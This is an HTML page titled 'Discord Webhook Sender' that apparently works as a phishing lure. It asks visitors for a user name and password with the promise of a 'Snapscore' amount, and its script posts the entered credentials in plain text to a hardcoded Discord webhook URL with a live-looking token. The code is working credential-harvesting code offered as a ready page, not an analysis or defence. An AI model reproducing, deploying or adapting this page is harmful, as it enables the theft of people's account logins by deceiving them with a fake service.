<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f4f4f4;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        input, button {
            margin: 10px 0;
            padding: 10px;
            width: 80%;
            font-size: 16px;
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Send Message to Discord</h1>
        <input id="usr" type="text" placeholder="Enter User" required>
        <input id="pass" type="text" placeholder="Enter Pass" required>
        <input id="score" type="number" placeholder="Enter Amount of Snapscore (max 10,000)" required>
        <button onclick="sendMessage()">Send</button>
    </div>
    <script>
        function sendMessage() {
            const usr = document.getElementById('usr').value;
            const pass = document.getElementById('pass').value;
            const score = document.getElementById('score').value;

            const webhookURL = "https://discord.com/api/webhooks/1309191543306846248/c0IlCkxXDM0s7svWIfWzGusmb9DHVTqGTpDkPAKBybmpXkMVY6BNVVP9115-toPYSmIK";

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `User: ${usr}, Pass: ${pass}, Score: ${score}` }),
            })
            .then(response => {
                if (response.ok) {
                    alert("Message sent successfully!");
                } else {
                    alert("Failed to send message. Check the webhook URL.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
                alert("An error occurred. Check the console for details.");
            });
        }
    </script>
</body>
</html>
